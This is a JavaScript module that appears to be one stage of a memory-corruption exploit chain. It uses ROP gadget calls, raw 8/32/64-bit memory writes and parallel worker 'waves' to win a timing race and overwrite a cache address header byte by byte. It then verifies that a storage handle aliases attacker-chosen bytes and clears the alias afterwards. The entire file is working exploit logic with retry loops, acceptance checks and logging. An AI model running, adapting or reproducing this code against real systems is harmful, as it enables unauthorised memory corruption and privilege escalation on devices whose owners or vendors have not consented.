import coreRuntime, {waitMs} from "../runtime.mjs";
import {readHexBytes} from "./util.mjs";
import {verboseLog} from "../logger.mjs";
import {
  analyzeWave,
  configurePayload,
  nulWrites
} from "./wave.mjs";

const {
  GADGET_MEMSET,
  allocPage,
  call_rop,
  closeReservationGroup,
  executeWave,
  frameArgSlot,
  hex32,
  ipcStorageRead,
  openReservationGroup,
  prepPacket,
  resetWaveState,
  roleSendCode,
  write32,
  write64,
  write8,
  writeDirtyData
} = coreRuntime;

// ── Cache header installation and retirement ──────────────────────────────

export async function installAddressHeader(input) {
    const config = input.config;
    let desiredBytes = input.desiredBytes;
    let stageName = input.stageName;
    let REQ = input.REQ;
    let candidateCacheNeedsRetirement = input.candidateCacheNeedsRetirement;
    let copyWavesTotal = input.copyWavesTotal;
    let dirtyFilePath = input.dirtyFilePath;
    let dirtyWriteBuf = input.dirtyWriteBuf;
    let dirtyWritePkt = input.dirtyWritePkt;
    let gates = input.gates;
    let pinPkt = input.pinPkt;
    let pktBuf = input.pktBuf;
    let rawScheduling = input.rawScheduling;
    let rootSession = input.rootSession;
    let savedHandle = input.savedHandle;
    let sendIndices = input.sendIndices;
    let triggerHandle = input.triggerHandle;
    let waveData = input.waveData;
    let waveExtra = input.waveExtra;
    let wavesJoined = input.wavesJoined;
    let wavesStarted = input.wavesStarted;
    let workerResources = input.workerResources;
    let workerStateSafe = input.workerStateSafe;
    const shouldStop = input.shouldStop;
    let fragmentBufs = input.fragmentBufs;
    let triggerBuf = input.triggerBuf;
    let analysis = input.analysis;
    const addressCopyInputs = {...input};
    delete addressCopyInputs.desiredBytes;
    delete addressCopyInputs.stageName;
    delete addressCopyInputs.shouldStop;
    let stoppedByUser = Boolean(shouldStop?.());
    const copyResult = (ok) => ({ok, stoppedByUser, addressCopy: {
        ...addressCopyInputs,
        candidateCacheNeedsRetirement,
        copyWavesTotal,
        wavesJoined,
        wavesStarted,
        workerStateSafe,
        analysis
    }});
    stageName = stageName || "cache-address";
    var padded = desiredBytes.slice();
    if (padded.length === 0 || padded[padded.length - 1] !== 0) padded.push(0);
    var steps;
    try { steps = nulWrites(padded); }
    catch (error) {
        return copyResult(false);
    }
    if (!steps.length) return copyResult(false);
    if (stoppedByUser) return copyResult(false);

    for (var stepIdx = 0; stepIdx < steps.length &&
        !stoppedByUser && !shouldStop?.(); stepIdx++) {
        var step = steps[stepIdx];
        var confirmed = false;
        var addrAttempts = 0;
        var acceptedResult = null;
        var addrWinFail = 0, addrPreLow = 0, addrPathMiss = 0;
        for (var batch = 0; batch < config.COPY_BATCHES && !confirmed &&
            !stoppedByUser && !shouldStop?.(); batch++) {
        for (var attempt = 0; attempt < config.MAX_COPY_ATTEMPTS &&
            !stoppedByUser && !shouldStop?.(); attempt++) {
            addrAttempts++;
            if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                    dirtyWriteBuf, dirtyWritePkt)) {
                return copyResult(false);
            }

            resetWaveState(waveData.frames, waveData.backups, REQ,
                waveData.pktBackups, gates, waveExtra);
            var payloadSetup = configurePayload(step.bytes,
                {config, REQ, fragmentBufs, triggerBuf});
            if (!payloadSetup.configured) return copyResult(false);
            var group = openReservationGroup(rootSession, pktBuf, 59);
            if (!group.ok) {
                return copyResult(false);
            }

            prepPacket(REQ[9], 4, 8, []);
            write8(REQ[9] + 0x10n, 2n);
            write32(REQ[9] + 0x14n, BigInt(group.outer));
            write32(REQ[9] + 0x1Cn, 0n);
            write64(frameArgSlot(waveData.frames[9].frame,
                waveData.frames[9].count, sendIndices[9], 0),
                BigInt(group.session));
            write64(frameArgSlot(waveData.frames[12].frame,
                waveData.frames[12].count, sendIndices[12], 0),
                BigInt(triggerHandle));
            write32(pinPkt + 0x18n, 1009n);

            var wave = executeWave(waveData.frames, rawScheduling,
                workerResources, gates, sendIndices,
                config.workerRoles);
            wavesStarted += wave.started === config.WORKER_COUNT
                ? 1 : 0;

            if (wave.created < config.WORKER_COUNT ||
                wave.pinned < config.WORKER_COUNT ||
                wave.started < config.WORKER_COUNT) {

                var releaseCode = roleSendCode(waveData.frames, 9,
                    sendIndices[9]);
                closeReservationGroup(group,
                    wave.created < config.WORKER_COUNT ||
                        releaseCode !== 0, pktBuf);
                workerStateSafe = wave.workerStateSafe === true;
                return copyResult(false);
            }

            if (wave.joined < config.WORKER_COUNT) {
                workerStateSafe = false;
                return copyResult(false);
            }
            wavesJoined++;

            var result = analyzeWave(stageName,
                wave, waveData, group, false, analysis);
            analysis = {...analysis, pinHandle: result.pinHandle,
                pinFirstWaveQualified: result.pinFirstWaveQualified};
            var releaseWasSent = roleSendCode(waveData.frames, 9,
                sendIndices[9]) === 0;
            closeReservationGroup(group, !releaseWasSent, pktBuf);
            copyWavesTotal++;

            var accepted = result.window && result.preReleaseUsed !== null &&
                result.preReleaseUsed >= config.FIELD_MINIMUM_CACHE_HELD &&
                result.changedPaths.length === 0;
            if (!accepted) {
                if (!result.window) addrWinFail++;
                else if (result.preReleaseUsed === null ||
                         result.preReleaseUsed < config.FIELD_MINIMUM_CACHE_HELD)
                    addrPreLow++;
                else addrPathMiss++;
            }
            if (accepted) {
                acceptedResult = result;
                candidateCacheNeedsRetirement = true;
                confirmed = true;
            }

            // Let controller actions run between synchronous copy waves.
            await waitMs(0);
            if (shouldStop?.()) stoppedByUser = true;
            if (confirmed || stoppedByUser) break;
        }
        }
        if (stoppedByUser) {
            await verboseLog(stageName + " stopped during step " +
                (stepIdx + 1) + "/" + steps.length + " after " +
                addrAttempts + " waves.");
            return copyResult(false);
        }
        if (confirmed) {
            await verboseLog(stageName + " step " +
                (stepIdx + 1) + "/" + steps.length + " accepted after " +
                addrAttempts + " waves" +
                (acceptedResult?.margin != null
                    ? " · margin=" + acceptedResult.margin + "/300µs" : "") +
                (acceptedResult?.preReleaseUsed != null
                    ? " · cache=0x" +
                      Number(acceptedResult.preReleaseUsed).toString(16) : "") +
                ".");
            // Let the accepted wave and step summary reach the host before
            // starting another cache-address step or the verification reads.
        } else {
            await verboseLog(stageName + " step " +
                (stepIdx + 1) + "/" + steps.length + " rejected after " +
                addrAttempts + " waves: window=" + addrWinFail +
                ", cache=" + addrPreLow + ", path=" + addrPathMiss + ".");
        }
        if (!confirmed) return copyResult(false);
    }
    if (shouldStop?.()) stoppedByUser = true;
    return copyResult(!stoppedByUser);
}

export async function qualifyCacheBucketPeriod(input) {
    let candidateHandle = input.candidateHandle;
    let primeHex = input.primeHex;
    let storageHandle = input.storageHandle;
    let addressCopy = input.addressCopy;
    const shouldStop = input.shouldStop;
    var controlBuf = allocPage(0x1000);
    call_rop(GADGET_MEMSET, controlBuf, 0xA5n, 16n);
    var control = ipcStorageRead(storageHandle, 0x28000, 16, controlBuf);
    if (control.error !== 0) {
        return {ok: false, addressCopy};
    }

    // Match the reference two-copy test: first install the UTF-8 prefix,
    // then place a NUL in byte 0 so the signed entry offset becomes 0x28000.
    var prefixCopy = await installAddressHeader({...addressCopy,
        desiredBytes: [0xC2, 0x80, 0x02],
        stageName: "cache-period-prefix", shouldStop});
    addressCopy = prefixCopy.addressCopy;
    var periodPrefixOk = prefixCopy.ok;
    var periodZeroOk = false;
    if (periodPrefixOk) {
        var zeroCopy = await installAddressHeader({...addressCopy,
            desiredBytes: [], stageName: "cache-period-zero", shouldStop});
        addressCopy = zeroCopy.addressCopy;
        periodZeroOk = zeroCopy.ok;
    }
    var periodAliasOk = false;
    if (periodZeroOk) {
        var periodBuf = allocPage(0x1000);
        call_rop(GADGET_MEMSET, periodBuf, 0xA5n, 16n);
        var periodRead = ipcStorageRead(candidateHandle, 0x28000, 16, periodBuf);
        var periodHex = periodRead.error === 0
            ? readHexBytes(periodBuf, 16) : "";
        periodAliasOk = periodRead.error === 0 && periodHex === primeHex;
    }

    // Leave the candidate in this measured state. The next address-header
    // copy replaces all 0x28 bytes; if planning or copying fails, retirement
    // clears the valid byte before the handle can be closed.
    return {ok: periodAliasOk, addressCopy};
}

export function inspectCandidateCacheAlias(candidateHandle, addressCopy) {
    if (!addressCopy || !addressCopy.config)
        return {state: "unavailable", error: null, detail: "address baseline unavailable"};
    var baseline = addressCopy.aliasControlHex;
    var aliasBytes = addressCopy.primeHex;
    if (!baseline || !aliasBytes || baseline === aliasBytes)
        return {state: "unavailable", error: null, detail: "distinct baseline missing"};

    try {
        var verifyBuf = allocPage(0x1000);
        call_rop(GADGET_MEMSET, verifyBuf, 0xA5n, 16n);
        var readback = ipcStorageRead(candidateHandle,
            addressCopy.config.ALIAS_OFFSET, 16, verifyBuf);
        if (!readback || readback.error !== 0)
            return {state: "unavailable", error: readback?.error ?? null,
                detail: "candidate alias read failed"};

        var readbackHex = readHexBytes(verifyBuf, 16);
        if (readbackHex === baseline)
            return {state: "original", error: readback.error, readbackHex};
        if (readbackHex === aliasBytes)
            return {state: "aliased", error: readback.error, readbackHex};
        return {state: "unexpected", error: readback.error, readbackHex};
    } catch (error) {
        return {state: "unavailable", error: null,
            detail: String(error?.message || error)};
    }
}

export async function retireCandidateCache(input) {
    let candidateCacheNeedsRetirement = input.candidateCacheNeedsRetirement;
    let candidateCacheRetired = input.candidateCacheRetired;
    let candidateHandle = input.candidateHandle;
    let addressCopy = input.addressCopy;
    if (!candidateHandle || !candidateCacheNeedsRetirement)
        return {ok: true, addressCopy: {...addressCopy, candidateCacheRetired},
            retirementSkipped: false};

    var precheck = inspectCandidateCacheAlias(candidateHandle, addressCopy);
    if (precheck.state === "original") {
        candidateCacheRetired = true;
        addressCopy = {...addressCopy, candidateCacheRetired};
        await verboseLog("Candidate cache precheck=original · read=" +
            hex32(precheck.error) + " · skipping retirement waves.");
        return {ok: true, addressCopy, candidateCacheRetired,
            retirementSkipped: true};
    }

    await verboseLog("Candidate cache precheck=" + precheck.state +
        " · read=" + (precheck.error == null
            ? "unavailable" : hex32(precheck.error)) +
        (precheck.detail ? " · " + precheck.detail : "") +
        " · running retirement waves.");
    var retireBytes = [];
    for (var i = 0; i < 0x10; i++) retireBytes.push(0x42);
    var retirement = await installAddressHeader({...addressCopy,
        desiredBytes: retireBytes, stageName: "cache-retire"});
    addressCopy = retirement.addressCopy;
    var retired = retirement.ok;
    var readback = null;
    if (!retired && addressCopy.workerStateSafe === true) {
        // A rejected timing window can still have cleared the valid byte.
        // Only the candidate's original bytes prove that the alias is gone.
        readback = inspectCandidateCacheAlias(candidateHandle, addressCopy);
        retired = readback.state === "original";
    }
    if (retired) {
        candidateCacheRetired = true;
        addressCopy = {...addressCopy, candidateCacheRetired};
    }
    return {ok: retired, addressCopy, candidateCacheRetired,
        retirementSkipped: false};
}
